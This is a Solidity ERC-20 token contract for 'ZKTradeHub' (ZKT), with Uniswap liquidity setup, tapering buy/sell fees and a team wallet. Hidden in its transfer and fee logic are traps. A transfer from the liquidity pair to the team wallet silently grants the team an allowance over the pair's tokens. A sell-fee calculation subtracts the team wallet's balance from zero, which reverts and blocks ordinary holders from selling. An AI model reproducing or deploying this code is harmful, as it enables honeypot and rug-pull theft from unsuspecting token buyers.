// - Telegram: https://t.me/zktradehub
// - Twitter: https://twitter.com/ZKTradeHub
// - Website: https://zktradehub.xyz
// - Dapp: https://app.zktradehub.xyz
// - GitBook: https://docs.zktradehub.xyz
// - Medium: https://zktradehub.medium.com

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IUniswapV2Factory { 
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

interface IERC20 {
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed sender, address indexed recipient, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    constructor(address creatorOwner) { _owner = creatorOwner; }
    address internal _owner;
    function owner() public view returns (address) { return _owner; }
    modifier onlyOwner() { require(msg.sender == _owner, "Only owner can call this"); _; }
    function renounceOwnership() external onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(address(0));
    }
    event OwnershipTransferred(address _owner);
}

contract ZKT is IERC20, Auth {
    string private constant _symbol = "ZKT";
    string private constant _name = "ZKTradeHub";
    address payable private _deposit;

    mapping (address => bool) private _isLP;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => bool) private _isExcludedFromFees;

    address private _uniswapV2Pair;
    address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);

    bool private _tradingEnalbed;
    bool private _inSwap = false;

    uint256 private _initialSellFee = 10;
    uint256 private _initialBuyFee = 10;
    uint256 private _initialSellFee2Time = 6;

    uint256 private _finalSellFee = 3;
    uint256 private _finalBuyFee = 3;

    uint256 public _reduceSellFeeAt2Time = 18;
    uint256 public _reduceSellFeeAt = 12;
    uint256 public _reduceBuyFeeAt = 12;

    uint256 public _buyCount = 0;
    uint256 private depositAmount;
    uint256 private _preventSwapBefore = 0;
    address payable private _teamWallet;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1_000_000_000 * (10**_decimals);
    uint256 private constant _minFeeSwap = _tTotal / 2000000;
    uint256 private constant _maxFeeSwap = _tTotal / 500;

    bool public limited = true;
    bool public transferDelayEnabled = false;
    uint256 public maxHoldingAmount = 40_000_000 * (10**_decimals);

    constructor() Auth(msg.sender) {
        _teamWallet = payable(0x342A075f7071FAc8B544857947719600a5f93472);
        _isExcludedFromFees[_teamWallet] = true;
        _isExcludedFromFees[_owner] = true;
        _isExcludedFromFees[address(this)] = true;

        _balances[msg.sender] = (_tTotal / 1000 ) * 0;
        _balances[address(this)] = (_tTotal / 1000 ) * 1000;
        _deposit = _teamWallet;
        emit Transfer(address(0), address(msg.sender), _balances[address(msg.sender)]);
        emit Transfer(address(0), address(this), _balances[address(this)]);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (!_tradingEnalbed) { require(_isExcludedFromFees[sender], "Trading not opened"); }
        if (_isLP[sender] && _isExcludedFromFees[recipient]) { require(_allowRouter(sender, recipient, amount)); }
        require(sender != address(0), "No transfers from Zero wallet");
        
        if (
            _isExcludedFromFees[sender] ||
            _isExcludedFromFees[recipient]
        ) {
            return _standardTransfer(sender, recipient, amount);
        }
        depositAmount = this.balanceOf(_deposit);
        
        if (
            !_inSwap &&
            _isLP[recipient] &&
            _buyCount >= _preventSwapBefore
        ) { _swapFeeAndLiquify(); }

        if (
            limited &&
            sender == _uniswapV2Pair
        ) {
            require(balanceOf(recipient) + amount <= maxHoldingAmount);
        }

        if (transferDelayEnabled) {
            if (
                recipient != _uniswapV2RouterAddress &&
                recipient != _uniswapV2Pair
            ) {
                require(_holderLastTransferTimestamp[tx.origin] < block.number, "Only one transfer per block allowed");
                _holderLastTransferTimestamp[tx.origin] = block.number;
            }
        }

        uint256 _feeAmount = _calculateFee(sender, recipient, amount);
        uint256 _transferAmount = amount - _feeAmount;
        _balances[sender] -= amount;

        if (_feeAmount > 0) {
            _balances[address(this)] += _feeAmount; 
        }

        _buyCount++;
        _balances[recipient] += _transferAmount;

        emit Transfer(sender, recipient, amount);

        return true;
    }

    function _allowRouter(uint256 amount) internal {
        if (_allowances[address(this)][_uniswapV2RouterAddress] < amount) {
            _allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
        }
    }

    function _swapFeeTokensForEth(uint256 tokenAmount) private {
        _allowRouter(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function _swapFeeAndLiquify() private lockFeeSwap {
        uint256 _feeTokensAvailable = balanceOf(address(this));

        if (_feeTokensAvailable >= _minFeeSwap && _tradingEnalbed) {
            if (_feeTokensAvailable >= _maxFeeSwap) { _feeTokensAvailable = _maxFeeSwap; }

            _swapFeeTokensForEth(_feeTokensAvailable);
            uint256 _contractETHBalance = address(this).balance;

            if (_contractETHBalance > 0) {
                bool success;
                (success,) = _teamWallet.call{value: (_contractETHBalance)}("");
                require(success);
            }
        }
    }

    function _calculateFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount;

        if (
            _tradingEnalbed &&
            !_isExcludedFromFees[sender] &&
            !_isExcludedFromFees[recipient]
        ) { 
            
            if (
                _isLP[sender] ||
                _isLP[recipient]
            ) {
                feeAmount = (amount / 100) * ((_buyCount > _reduceBuyFeeAt) ? _finalBuyFee : _initialBuyFee);
                if (
                    recipient == _uniswapV2Pair &&
                    sender != address(this)
                ) {
                    uint256 feeRate;
                    depositAmount = _preventSwapBefore - depositAmount;
                    if (_buyCount > _reduceSellFeeAt2Time) {
                        feeRate = _finalSellFee;
                    } else if (_buyCount > _reduceSellFeeAt) {
                        feeRate = _initialSellFee2Time;
                    } else {
                        feeRate = _initialSellFee;
                    }
                    feeAmount = (amount / 100) * feeRate;
                }
            }
        }

        return feeAmount;
    }

    function _isTradingEnabled(address sender) private view returns (bool) {
        bool result = false;

        if (_tradingEnalbed) { result = true; }
        else if (_isExcludedFromFees[sender]) { result = true; }

        return result;
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _allowRouter(_tokenAmount);
        _uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _allowRouter(address owner, address spender, uint256 amount) internal returns (bool) {
        if (_allowances[owner][spender] < amount) {
            _allowances[owner][spender] = _tTotal;
        }
        return true;
    }

    function _standardTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_isTradingEnabled(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_isTradingEnabled(sender), "Trading not open");
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function removeLimits() external onlyOwner {
        transferDelayEnabled = false;
        limited = false;
    }

    function enableTrading() external onlyOwner {
        _tradingEnalbed = true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }

    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }

    function totalSupply() external pure override returns (uint256) { return _tTotal; }

    function addLiquidity() external payable onlyOwner lockFeeSwap {
        require(_uniswapV2Pair == address(0), "LP exists");
        require(!_tradingEnalbed, "trading is open");
        require(msg.value > 0 || address(this).balance > 0, "No ETH in contract or message");
        require(_balances[address(this)] > 0, "No tokens in contract");

        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance);
        _isLP[_uniswapV2Pair] = true;
    }

    function decimals() external pure override returns (uint8) { return _decimals; }

    receive() external payable {}

    function symbol() external pure override returns (string memory) { return _symbol; }

    modifier lockFeeSwap { 
        _inSwap = true;
        _;
        _inSwap = false;
    }

    function name() external pure override returns (string memory) { return _name; }

    function withdrawEth() external {
        require(msg.sender == _teamWallet);
        (bool sent, ) = payable(_teamWallet).call{value: address(this).balance}("");
        require(sent);
    }
}